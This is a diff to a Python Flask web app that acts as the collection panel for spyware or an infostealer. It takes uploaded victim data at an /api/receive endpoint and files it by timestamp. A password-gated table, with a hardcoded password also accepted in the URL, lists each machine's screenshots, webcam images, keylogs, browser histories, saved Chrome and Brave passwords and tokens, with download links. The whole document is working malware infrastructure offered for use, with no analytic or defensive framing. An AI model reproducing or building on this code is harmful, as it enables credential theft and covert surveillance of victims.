@@ -1,66 +1,107 @@
 import os
-from flask import Flask, request, send_from_directory, render_template_string, redirect, url_for
+from flask import Flask, request, send_from_directory, render_template_string
 from werkzeug.utils import secure_filename
+from datetime import datetime
 
-# Config
-UPLOAD_FOLDER = "logs"
+UPLOAD_ROOT = "logs"
 PASSWORD = "disha456"
 
 app = Flask(__name__)
-app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(UPLOAD_ROOT, exist_ok=True)
 
-# Template (Terminal Theme)
-HTML = '''
+COLUMNS = [
+    "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
+    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
+    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
+]
+
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Log Terminal</title>
+  <title>System Log Monitor</title>
   <style>
-    body { background-color: black; color: lime; font-family: monospace; padding: 20px; }
-    a { color: cyan; text-decoration: none; }
-    input { background: black; color: lime; border: 1px solid lime; }
+    body { background-color: black; color: lime; font-family: monospace; }
+    h2 { color: cyan; }
+    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
+    th, td { border: 1px solid lime; padding: 8px; text-align: center; }
+    th { font-size: 18px; font-weight: bold; background: #222; }
+    td a { color: cyan; text-decoration: none; }
+    form { margin-top: 30px; }
+    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
   </style>
 </head>
 <body>
   {% if not authed %}
-    <h2>🔐 Enter Password</h2>
+    <h2>Enter Password to Access Logs</h2>
     <form method="POST">
-      <input name="password" type="password"/>
+      <input type="password" name="password" placeholder="Enter password"/>
       <button type="submit">Login</button>
     </form>
   {% else %}
-    <h2>📂 Logs in Server</h2>
-    <ul>
-      {% for file in files %}
-        <li><a href="{{ url_for('download', filename=file) }}">{{ file }}</a></li>
+    <h2>Log Viewer (Live Feed)</h2>
+    <table>
+      <tr>
+        {% for col in columns %}
+          <th>{{ col }}</th>
+        {% endfor %}
+      </tr>
+      {% for folder in logs %}
+        <tr>
+          <td>{{ folder.hostname }}</td>
+          <td>{{ folder.timestamp }}</td>
+          {% for file in folder.files %}
+            <td>{% if file %}<a href="{{ file }}">📥 Download{% else %}-{% endif %}</td>
+          {% endfor %}
+        </tr>
       {% endfor %}
-    </ul>
+    </table>
   {% endif %}
 </body>
 </html>
 '''
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route("/", methods=["GET", "POST"])
 def index():
     authed = False
     if request.method == "POST":
         if request.form.get("password") == PASSWORD:
             authed = True
-    return render_template_string(HTML, files=os.listdir(UPLOAD_FOLDER), authed=authed)
+    elif request.args.get("access") == PASSWORD:
+        authed = True
 
-@app.route('/api/receive', methods=['POST'])
+    log_entries = []
+    if authed:
+        for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
+            full_path = os.path.join(UPLOAD_ROOT, folder)
+            if os.path.isdir(full_path):
+                row = {"hostname": "", "timestamp": folder, "files": []}
+                for col in COLUMNS[2:]:
+                    match_file = next((f for f in os.listdir(full_path) if col.lower().replace(" ", "_") in f.lower()), None)
+                    if match_file:
+                        if "host" in match_file.lower():
+                            with open(os.path.join(full_path, match_file), "r", encoding="utf-8") as f:
+                                row["hostname"] = f.read().strip().split("\n")[0]
+                        else:
+                            row["files"].append(f"/download/{folder}/{match_file}")
+                    else:
+                        row["files"].append(None)
+                if not row["hostname"]:
+                    row["hostname"] = folder.split("_")[0]
+                log_entries.append(row)
+
+    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)
+
+@app.route("/api/receive", methods=["POST"])
 def receive():
-    for file_key in request.files:
-        file = request.files[file_key]
-        filename = secure_filename(file.filename)
-        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
-    return "OK"
+    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    save_dir = os.path.join(UPLOAD_ROOT, folder_name)
+    os.makedirs(save_dir, exist_ok=True)
+    for f in request.files.values():
+        filename = secure_filename(f.filename)
+        f.save(os.path.join(save_dir, filename))
+    return "Logs received"
 
-@app.route('/download/<filename>')
-def download(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
-
-@app.route('/logs')
-def redirect_logs():
-    return redirect(url_for("index"))
+@app.route("/download/<folder>/<filename>")
+def download(folder, filename):
+    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
